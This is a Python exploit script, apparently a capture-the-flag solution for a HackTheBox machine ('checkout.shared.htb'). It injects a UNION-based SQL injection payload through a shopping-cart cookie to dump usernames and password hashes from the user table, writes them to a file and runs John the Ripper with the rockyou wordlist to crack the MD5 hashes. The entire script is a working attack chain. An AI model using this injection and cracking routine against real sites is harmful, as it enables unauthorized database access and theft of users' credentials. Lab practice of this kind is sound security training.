#!/usr/bin/python3

import requests, bs4, warnings, subprocess

warnings.simplefilter("ignore")

target = "https://checkout.shared.htb/"
cookies = {"custom_cart": "{\"' union select 1,group_concat(username, ':',password),3 from checkout.user-- -\":\"1\"}"}

request = requests.get(target, cookies=cookies, verify=False)
parser = bs4.BeautifulSoup(request.content, 'html.parser')
result = parser.find("table").find("td").text

print(result)

with open("hash.txt", "w") as file:
    file.write(result)

print("Hash guardado en 'hash.txt'")
john_command = ["john", "--format=raw-md5", "--wordlist=/usr/share/wordlists/rockyou.txt", "hash.txt"]
subprocess.run(john_command)
show_command = ["john", "--show", "hash.txt"]
result = subprocess.run(show_command, capture_output=True, text=True)
print(result.stdout)
